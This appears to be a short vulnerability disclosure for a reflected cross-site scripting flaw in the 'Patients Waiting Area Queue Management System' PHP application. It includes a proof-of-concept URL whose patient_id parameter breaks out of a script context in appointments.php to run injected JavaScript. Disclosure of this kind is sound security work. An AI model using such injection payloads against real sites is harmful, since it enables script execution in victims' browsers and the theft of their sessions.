### Patients Waiting Area Queue Management System - XSS

### Date: 2026-01/28
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/18348/patients-waiting-area-queue-management-system.html
### Tested on: MacOs13.5 + phpstudy

# /appointments.php（XSS）

### Sample request POC #1

```
http://localhost:8887/appointments.php?patient_id=%22});alert(222);document.getElementById(%27appointmentForm%27).addEventListener(%27submit%27,%20function(e)%20{var%20patient_id=%22
```

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-113814.png "Patients Waiting Area Queue Management System")

### Vulnerability code
appointments.php:424
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-113821.png "Patients Waiting Area Queue Management System")
